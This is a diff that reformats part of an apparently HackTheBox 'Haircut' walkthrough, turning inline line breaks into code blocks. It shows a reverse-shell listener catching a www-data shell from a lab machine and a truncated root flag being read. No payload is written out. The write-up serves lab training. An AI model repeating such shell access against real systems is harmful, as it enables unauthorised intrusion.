@@ -37,7 +37,13 @@ It can be seen that there was a curl request being made. Hence, we could use cur
 After setting up a listener, we get a user shell!
 
 ```bash
-listening on [any] 9001 …<br></br>connect to [10.10.14.10] from (UNKNOWN) [10.10.10.24] 53864<br></br>bash: cannot set terminal process group (1249): Inappropriate ioctl for device<br></br>bash: no job control in this shell<br></br>www-data@haircut:~/html/uploads$ id<br></br>id<br></br>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+listening on [any] 9001
+connect to [10.10.14.10] from (UNKNOWN) [10.10.10.24] 53864
+bash: cannot set terminal process group (1249): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@haircut:~/html/uploads$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 ## Privilege Escalation
@@ -61,6 +67,7 @@ ls
 root.txt
 ```
 
-`cat root.txt<br></br>4c...........................`
-
-title="“Hackthebox – Lame” — VEDANT TARE" width="600"></iframe></div></figure>
+```bash
+cat root.txt
+4c...........................
+```
